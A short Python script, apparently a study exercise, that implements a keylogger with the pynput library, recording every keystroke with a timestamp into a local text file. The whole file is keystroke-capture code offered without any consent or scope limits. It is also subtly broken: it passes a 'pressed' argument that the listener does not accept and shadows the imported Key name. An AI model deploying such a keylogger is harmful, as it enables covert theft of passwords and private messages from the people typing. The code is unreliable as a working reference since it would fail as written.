import pynput
from pynput.keyboard import Key,Listener
import logging

ld=r'D:/my study/Keyrec'
logging . basicConfig(filename=(ld+ r"/keyLog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def pressed(Key):
    logging.info(str(Key))
with Listener(pressed=pressed) as listener:
    listener.join()    